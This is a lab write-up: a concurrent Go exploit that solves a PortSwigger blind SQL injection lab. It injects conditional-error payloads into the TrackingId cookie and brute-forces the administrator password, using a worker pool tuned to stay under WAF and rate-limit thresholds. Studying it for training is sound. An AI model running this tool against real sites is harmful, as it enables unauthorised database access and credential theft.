### PortSwigger Lab: Blind SQL Injection with Conditional Errors (Go Exploit)
This is a high-performance, concurrent exploitation tool written in Go to solve the PortSwigger Web Security Academy lab: [Blind SQL injection with conditional errors](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors).

**🛠️ Code Implementation**
The exploit is written in Go (Golang) to leverage its native concurrency primitives for speed and efficiency. Unlike simple Python scripts that often run sequentially or struggle with thread overhead, this tool uses a Producer-Consumer pattern to brute-force the password rapidly.
**Key Features**
- Concurrent Workers: Utilizes Golang goroutines and channels to spin up a worker pool (default: 20 workers). This allows multiple character checks to happen simultaneously.
- Connection Pooling: The http.Client is tuned with a custom Transport. It explicitly increases MaxIdleConnsPerHost to reuse TCP connections (Keep-Alive), eliminating the overhead of repeated TCP/TLS handshakes.
- Context Propagation: Implements context.WithCancel. The moment a worker finds the correct character, it cancels the context, instantly killing all other active requests for that position to save bandwidth.
- Graceful Shutdown: Includes signal handling (os.Interrupt) to ensure the tool exits cleanly if the user presses Ctrl+C.
- Payload Encoding: Uses net/url to safely encode the SQL injection payload, ensuring the TrackingId cookie is formatted correctly for the server.

```golang
package main

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

// Configuration
const (
	TargetURL   = "https://0ab000cf04ce1f4e8083082400a00081.web-security-academy.net/"
	PasswordLen = 20
	MaxWorkers  = 20 // 20 is sufficient; too many might trigger WAF or rate limits
	Charset     = "abcdefghijklmnopqrstuvwxyz0123456789"
)

// Global HTTP client optimized for connection reuse
var client = &http.Client{
	Timeout: 5 * time.Second, // Fail fast if server hangs
	Transport: &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	},
}

func main() {
	// Handle graceful shutdown (Ctrl+C)
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	fmt.Printf("[*] Target: %s\n", TargetURL)
	fmt.Printf("[*] Starting Blind SQLi (Error-Based)...\n")

	password := make([]rune, PasswordLen)

	start := time.Now()

	// Iterate through each password position
	for i := 1; i <= PasswordLen; i++ {
		char, found := findCharForPosition(ctx, i)
		if !found {
			fmt.Printf("\n[!] Failed to resolve character at index %d. Aborting.\n", i)
			break
		}
		password[i-1] = char
		// Print discovered character immediately
		fmt.Printf("\r[+] Found char %d/%d: %c                \n", i, PasswordLen, char)
	}

	fmt.Println("--------------------------------------------------")
	fmt.Printf("[*] Password Discovered: %s\n", string(password))
	fmt.Printf("[*] Time Elapsed: %s\n", time.Since(start))
}

// findCharForPosition orchestrates the worker pool for a single character position
func findCharForPosition(ctx context.Context, pos int) (rune, bool) {
	// Context for this specific position; allows cancelling all workers once found
	posCtx, cancel := context.WithCancel(ctx)
	defer cancel()

	jobs := make(chan rune, len(Charset))
	results := make(chan rune)
	var wg sync.WaitGroup

	// Spin up workers
	for w := 0; w < MaxWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(posCtx, pos, jobs, results)
		}()
	}

	// Feed the workers
	go func() {
		for _, char := range Charset {
			select {
			case <-posCtx.Done():
				return
			case jobs <- char:
			}
		}
		close(jobs)
	}()

	// Wait for result or completion
	go func() {
		wg.Wait()
		close(results)
	}()

	// Update UI while waiting for result
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case res, ok := <-results:
			if !ok {
				return 0, false // Channel closed, nothing found
			}
			return res, true // Found the char
		case <-ctx.Done():
			return 0, false // Main context cancelled
		case <-ticker.C:
			fmt.Printf("\r[*] Brute forcing position %d...", pos)
		}
	}
}

func worker(ctx context.Context, pos int, jobs <-chan rune, results chan<- rune) {
	for char := range jobs {
		// Check context before making request
		if ctx.Err() != nil {
			return
		}

		if performAttack(ctx, pos, char) {
			select {
			case results <- char:
				return
			case <-ctx.Done():
				return
			}
		}
	}
}

// performAttack sends the payload and returns true if the server responds with 500 (Internal Server Error)
func performAttack(ctx context.Context, pos int, char rune) bool {
	// Oracle SQL Payload: 
	// If the character matches, we trigger a divide-by-zero error (1/0).
	// If it doesn't match, we return '1', which makes the SQL valid.
	sqlPayload := fmt.Sprintf(
		"(SELECT CASE WHEN (SUBSTR(password,%d,1)='%c') THEN TO_CHAR(1/0) ELSE '1' END FROM users WHERE username='administrator')='1", 
		pos, char,
	)

	// Construct the Injection
	// We inject into the TrackingId cookie. We close the previous quote with '
	// Then add our AND condition.
	injection := fmt.Sprintf("' AND %s--", sqlPayload)
	
	// We only URL encode the injection part to ensure transmission safety
	// Note: We need to replace + with %20 because standard QueryEscape uses + for spaces
	encodedInjection := strings.ReplaceAll(url.QueryEscape(injection), "+", "%20")
	
	// Base cookie value (arbitrary string to close the initial query)
	cookieVal := "AccessId" + encodedInjection

	req, err := http.NewRequestWithContext(ctx, "GET", TargetURL, nil)
	if err != nil {
		return false
	}

	req.Header.Add("Cookie", fmt.Sprintf("TrackingId=%s", cookieVal))

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// In this lab, Status 500 means our 'CASE WHEN' hit the '1/0' logic -> Character Match
	return resp.StatusCode == http.StatusInternalServerError
}
```